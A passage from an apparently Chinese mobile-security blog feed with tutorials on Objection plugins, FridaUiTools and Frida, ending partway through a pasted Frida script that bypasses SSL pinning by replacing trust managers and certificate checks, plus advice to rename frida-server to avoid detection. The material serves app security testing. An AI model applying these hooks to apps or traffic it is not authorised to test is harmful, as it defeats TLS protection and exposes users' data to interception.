class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.objection/objection.log// objection日志文件位置</span><br><span class="line"></span><br><span class="line">~/.objection/objection_history//命令历史文件位置</span><br></pre></td></tr></table></figure></div><h2 id="四、Objection-插件"><a href="#四、Objection-插件" class="headerlink" title="四、Objection 插件"></a>四、Objection 插件</h2><h3 id="Wallbreaker"><a href="#Wallbreaker" class="headerlink" title="Wallbreaker"></a>Wallbreaker</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 插件地址</span><br><span class="line">https://github.com/hluwa/Wallbreaker</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">● 加载插件</span><br><span class="line">方法一：</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins/Wallbreaker(插件路径)</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker(插件路径)</span><br><span class="line"></span><br><span class="line">● 插件使用</span><br><span class="line"># 搜索类</span><br><span class="line">plugin wallbreaker classsearch &lt;pattern&gt; </span><br><span class="line"></span><br><span class="line"># 搜索类的实例对象</span><br><span class="line">plugin wallbreaker objectsearch com.example.androiddemo.Activity.LoginActivity</span><br><span class="line">//返回：</span><br><span class="line">[0x2262]: com.example.androiddemo.Activity.LoginActivity@d8a5160</span><br><span class="line"></span><br><span class="line"># 查看对象的一些属性和方法</span><br><span class="line">plugin wallbreaker objectdump 0x2262 --fullname</span><br><span class="line"></span><br><span class="line"># 输出类结构，打印数据中类的完整包名</span><br><span class="line">plugin wallbreaker classdump &lt;classname&gt; --fullname</span><br></pre></td></tr></table></figure></div><h3 id="FRIDA-DEXDump"><a href="#FRIDA-DEXDump" class="headerlink" title="FRIDA-DEXDump"></a>FRIDA-DEXDump</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 插件地址</span><br><span class="line">https://github.com/hluwa/frida-dexdump</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">● 加载插件</span><br><span class="line">方法一：</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins/Wallbreaker(插件路径)</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker(插件路径)</span><br><span class="line"></span><br><span class="line">● 插件使用</span><br><span class="line">plugin dexdump dump</span><br><span class="line">plugin dexdump search</span><br></pre></td></tr></table></figure></div><h3 id="watch-events"><a href="#watch-events" class="headerlink" title="watch_events"></a>watch_events</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 插件地址</span><br><span class="line">https://github.com/hluwa/objection-plugins</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">● 加载插件</span><br><span class="line">方法一：</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins/Wallbreaker(插件路径)</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker(插件路径)</span><br><span class="line"></span><br><span class="line">● 插件使用</span><br><span class="line">plugin watch_event onclick//监控点击事件，并打印出类，</span><br></pre></td></tr></table></figure></div><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.kanxue.com/thread-277929.htm</span><br><span class="line">https://www.cnblogs.com/lxh2cwl/p/14842544.html</span><br><span class="line">https://mabin004.github.io/2020/08/13/objection操作</span><br><span class="line">https://kuizuo.cn/docs/objection-note/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> Objection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动安全-FridaUiTools 工具使用</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FridaUiTools%20%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FridaUiTools%20%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>fridaUiTools 为 frida 常用的脚本的图形化管理工具，集成常用的 frida script，便于测试。项目地址：<a href="https://github.com/dqzg12300/fridaUiTools">https://github.com/dqzg12300/fridaUiTools</a></p><h2 id="二、基本使用"><a href="#二、基本使用" class="headerlink" title="二、基本使用"></a>二、基本使用</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>首先需要上传相应版本的 frida-server 至手机上的  <strong>&#x2F;data&#x2F;local&#x2F;tmp</strong> 并将 frida-server <strong>重命名为 fserver64</strong> ，这一步工具自带了 frida-server 只需要执行上传即可。而我们则需要将 adb 放置在 fridaUiTools 目录下，否则无法执行命令。<a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225165810734.png" data-caption="image-20231225165810734"><img src="/../images/mobile/frida/2/image-20231225165810734.png" alt="image-20231225165810734"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225162857970.png" data-caption="image-20231225162857970"><img src="/../images/mobile/frida/2/image-20231225162857970.png" alt="image-20231225162857970"></a></p><p>其次在工具左上方 <strong>执行 -&gt; 启动 frida-server -&gt; frida-server for arm64</strong>，点击后 fridaUiTools 会调用 cmd 终端执行 <strong>adb shell su -c ‘&#x2F;data&#x2F;local&#x2F;tmp&#x2F;fserver64 -l 0.0.0.0:7777’</strong> 命令启动 frida-server</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225163318454.png" data-caption="image-20231225163318454"><img src="/../images/mobile/frida/2/image-20231225163318454.png" alt="image-20231225163318454"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225163446608.png" data-caption="image-20231225163446608"><img src="/../images/mobile/frida/2/image-20231225163446608.png" alt="image-20231225163446608"></a></p><p>最后在工具上方点击 <strong>执行 -&gt; 附加进程 -&gt; 附加当前进程</strong> 或者指定都可以<a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225162732801.png" data-caption="image-20231225162732801"><img src="/../images/mobile/frida/2/image-20231225162732801.png" alt="image-20231225162732801"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225163446608.png" data-caption="image-20231225163446608"><img src="/../images/mobile/frida/2/image-20231225163446608.png" alt="image-20231225163446608"></a></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>想要进行自动找寻加解密函数，先停止程序，勾选 <strong>java加解密</strong> 然后重新启动，手机上打开待测app例子：获取 APP 加解密函数算法及相关调用栈。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225164100525-17077407867265.png" data-caption="image-20231225164100525"><img src="/../images/mobile/frida/2/image-20231225164100525-17077407867265.png" alt="image-20231225164100525"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225164143428.png" data-caption="image-20231225164143428"><img src="/../images/mobile/frida/2/image-20231225164143428.png" alt="image-20231225164143428"></a></p><p>手机上执行登录， fridaUiTools 自动找寻加解密的算法返回相关密钥以及调用栈，方便定位。然后就可以利用 jadx 打开 apk 根据调用栈定位代码进而进行代码分析。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225164237474-17077407036183.png" data-caption="image-20231225164237474"><img src="/../images/mobile/frida/2/image-20231225164237474-17077407036183.png" alt="image-20231225164237474"></a></p><p>点击调用 Wallbreaker 项目地址：<a href="https://github.com/hluwa/Wallbreaker%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%88%86%E6%9E%90">https://github.com/hluwa/Wallbreaker，用来分析</a> Java 类&#x2F;对象结构</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225165059039-17077513060477.png" data-caption="image-20231225165059039"><img src="/../images/mobile/frida/2/image-20231225165059039-17077513060477.png" alt="image-20231225165059039"></a></p><p>还有其它功能可自行去探索。</p>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动安全-Frida 应用分析及案例实践</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Frida%20%E5%BA%94%E7%94%A8%E5%88%86%E6%9E%90%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Frida%20%E5%BA%94%E7%94%A8%E5%88%86%E6%9E%90%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、Frida-简介"><a href="#一、Frida-简介" class="headerlink" title="一、Frida 简介"></a>一、Frida 简介</h2><p>Frida 是核心引擎使用 C 写的一款动态分析工具，通过 Frida 我们可以把一段 JavaScript、Python 等代码注入到一个正在运行中的应用程序进程中去。</p><h3 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h3><p>Frida 注入代码的过程通常被称为 Hook（钩子）。在运行中的应用程序拦截和修改函数或方法的执行流程称为 Hooking 。通过 Hook，我们可以在目标应用程序的指定函数执行前或执行后插入自定义的代码，从而改变函数的行为或捕获关键信息。换个思路理解就类似于我们日常 Burp 抓包修改，但 Hook 需要定位到相应的函数，然后通过编写 Hook 脚本修改其函数的行为或者达到其它目的，通常基本的脚本编写使用 Javascript 或者 Python，但 Frida 还提供了 Node.js、 Swift、.net、Qml 等语言的接口封装，根据个人选择。</p><p>Frida 注入代码的过程通常被称为 Hook（钩子）。在运行中的应用程序拦截和修改函数或方法的执行流程称为 Hooking 。通过 Hook，我们可以在目标应用程序的指定函数执行前或执行后插入自定义的代码，从而改变函数的行为或捕获关键信息。换个思路理解就类似于我们日常 Burp 抓包修改，但 Hook 需要定位到相应的函数，然后通过编写 Hook 脚本修改其函数的行为或者达到其它目的，通常基本的编写使用 Javascript 或者 Python，但Frida 还提供了 Node.js、 Swift、.net、Qml 等语言的接口封装，根据个人选择。</p><h3 id="相应功能"><a href="#相应功能" class="headerlink" title="相应功能"></a>相应功能</h3><p>在实际测试中，Frida 主要有以下几种功能可辅助安全测试人员进行测试。</p><ul><li>监视加密API</li><li>修改函数的输出</li><li>绕过 AES 加密</li><li>绕过 SSL Pinning、ROOT 检测</li><li>追踪应用代码</li><li>脱壳</li><li>……</li></ul><h2 id="二、工具安装"><a href="#二、工具安装" class="headerlink" title="二、工具安装"></a>二、工具安装</h2><p>frida 分为客户端和服务端，服务端一般在目标设备上运行的，客户端则在开发机上运行，如对 Android APP 的调试，服务端放在 Android 设备上，而客户端则在我们自己的电脑上安装即可。<strong>（注意：服务端与客户端的 frida 版本需要一致，否则可能会出现报错）</strong></p><p>1、服务端，下载地址：<a href="https://github.com/frida/frida%EF%BC%8C%E9%80%89%E6%8B%A9">https://github.com/frida/frida，选择</a> android-arm64.xz 版本</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125132155193.png" data-caption="image-20231125132155193"><img src="/../images/mobile/frida/1/image-20231125132155193.png" alt="image-20231125132155193"></a></p><p>使用 adb 上传至手机中，adb 下载地址：<a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn%EF%BC%88%E5%9C%A8%E8%BF%9B%E8%A1%8C">https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn（在进行</a> Android  APP 调试，测试机记得 ROOT，这边不赘述）, 以下执行可知，adb shell 进入后为 $ ,即默认权限为普通权限。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125131931077.png" data-caption="image-20231125131931077"><img src="/../images/mobile/frida/1/image-20231125131931077.png" alt="image-20231125131931077"></a></p><p>本人上传的为 data 目录，需要 root 权限，所以在执行上传文件前，先执行 adb root ，然后手机上点击允许调试。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125134232951.png" data-caption="image-20231125134232951"><img src="/../images/mobile/frida/1/image-20231125134232951.png" alt="image-20231125134232951"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push D:\app\test\frida-server-16.1.6-android-arm64 /data/app_test</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125134927921.png" data-caption="image-20231125134927921"><img src="/../images/mobile/frida/1/image-20231125134927921.png" alt="image-20231125134927921"></a></p><p>进入 adb shell 将上传的 frida 给予运行权限</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd /data/app_test</span><br><span class="line">chmod 777 frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125134816019.png" data-caption="image-20231125134816019"><img src="/../images/mobile/frida/1/image-20231125134816019.png" alt="image-20231125134816019"></a></p><p>2、客户端，客户端 frida 安装较为简单，直接使用 pip3 进行安装即可，但需要 python3.x 环境，这边使用 python 3.9 进行安装。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida// 安装 frida</span><br><span class="line">pip3 install frida==16.1.6 //指定版本安装</span><br><span class="line">pip3 install frida-tools // 安装 frida cli 工具，可运行 frida 某些命令</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125135652353.png" data-caption="image-20231125135652353"><img src="/../images/mobile/frida/1/image-20231125135652353.png" alt="image-20231125135652353"></a></p><p>3、验证，先在 Android 设备进入 frida-server 所在目录运行 frida-server 启动服务端<strong>（服务端最好修改一下名称，部分安全加固会将frida 字段进行安全检测）</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125135907946.png" data-caption="image-20231125135907946"><img src="/../images/mobile/frida/1/image-20231125135907946.png" alt="image-20231125135907946"></a></p><p>在电脑上使用 frida-tools 自带命令，查看是否已经和手机连接了，下图使用 frida-ps -Uia 命令查看手机上正在运行的程序，证明服务端与客户端通讯正常</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125140543748.png" data-caption="image-20231125140543748"><img src="/../images/mobile/frida/1/image-20231125140543748.png" alt="image-20231125140543748"></a></p><h2 id="三、实践案例"><a href="#三、实践案例" class="headerlink" title="三、实践案例"></a>三、实践案例</h2><h3 id="追踪程序函数"><a href="#追踪程序函数" class="headerlink" title="追踪程序函数"></a>追踪程序函数</h3><p>这边追踪某 APP  open()函数，查看其输出情况如何。</p><p>1、启动服务端（即手机上运行 frida-server）</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125212854538.png" data-caption="image-20231125212854538"><img src="/../images/mobile/frida/1/image-20231125212854538.png" alt="image-20231125212854538"></a></p><p>2、客户端（电脑上）进行追踪 open() 函数，首先查看正在运行的程序获取包名</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213212970.png" data-caption="image-20231125213212970"><img src="/../images/mobile/frida/1/image-20231125213212970.png" alt="image-20231125213212970"></a></p><p>选择其中一个带有 open() 函数的程序进行追踪。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -i open com.tencent.android.qqdownloader</span><br></pre></td></tr></table></figure></div><p>等待一段时间后，frida 开始 trace 到后台正在运行程序的 open() </p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213641791.png" data-caption="image-20231125213641791"><img src="/../images/mobile/frida/1/image-20231125213641791.png" alt="image-20231125213641791"></a></p><p>打开 APP 程序会发现 frida trace 到大量调用 open() 函数</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213758207.png" data-caption="image-20231125213758207"><img src="/../images/mobile/frida/1/image-20231125213758207.png" alt="image-20231125213758207"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213957887.png" data-caption="image-20231125213957887"><img src="/../images/mobile/frida/1/image-20231125213957887.png" alt="image-20231125213957887"></a></p><h3 id="Bypass-SSL-Pinning-amp-ROOT"><a href="#Bypass-SSL-Pinning-amp-ROOT" class="headerlink" title="Bypass SSL Pinning &amp; ROOT"></a>Bypass SSL Pinning &amp; ROOT</h3><p>网上 search 的 bypass 脚本，具体地址遗忘了</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;***********************************&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Start Bypass SSL Pinning Nowing *&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;***********************************&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> X509TrustManager = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.net.ssl.X509TrustManager&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">SSLContext</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.net.ssl.SSLContext&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">TrustManager</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;com.test.TrustManager&#x27;</span>,</span><br><span class="line">        <span class="attr">implements</span>: [X509TrustManager],</span><br><span class="line">        <span class="attr">methods</span>: &#123;</span><br><span class="line">            <span class="attr">checkClientTrusted</span>: <span class="keyword">function</span> (<span class="params">chain, authType</span>) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">checkServerTrusted</span>: <span class="keyword">function</span> (<span class="params">chain, authType</span>) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">getAcceptedIssuers</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> [];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">TrustManagers</span> = [<span class="title class_">TrustManager</span>.$new()];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">SSLContext</span>_init = <span class="title class_">SSLContext</span>.<span class="property">init</span>.<span class="title function_">overload</span>(</span><br><span class="line">        <span class="string">&#x27;[Ljavax.net.ssl.KeyManager;&#x27;</span>, <span class="string">&#x27;[Ljavax.net.ssl.TrustManager;&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="title class_">SSLContext</span>_init.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">keyManager, trustManager, secureRandom</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted trustmanager request&#x27;</span>);</span><br><span class="line">        <span class="title class_">SSLContext</span>_init.<span class="title function_">call</span>(<span class="variable language_">this</span>, keyManager, <span class="title class_">TrustManagers</span>, secureRandom);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup custom trust manager&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificatePinner</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;okhttp3.CertificatePinner&#x27;</span>);</span><br><span class="line">        <span class="title class_">CertificatePinner</span>.<span class="property">check</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.util.List&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted okhttp3: &#x27;</span> + str);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup okhttp3 pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into okhttp3 pinner&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.datatheorem.android.trustkit.pinning.OkHostnameVerifier&quot;</span>);</span><br><span class="line">        <span class="title class_">Activity</span>.<span class="property">verify</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted trustkit&#123;1&#125;: &#x27;</span> + str);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Activity</span>.<span class="property">verify</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.security.cert.X509Certificate&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted trustkit&#123;2&#125;: &#x27;</span> + str);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup trustkit pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into trustkit pinner&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustManagerImpl</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.android.org.conscrypt.TrustManagerImpl&#x27;</span>);</span><br><span class="line">        <span class="title class_">TrustManagerImpl</span>.<span class="property">verifyChain</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span 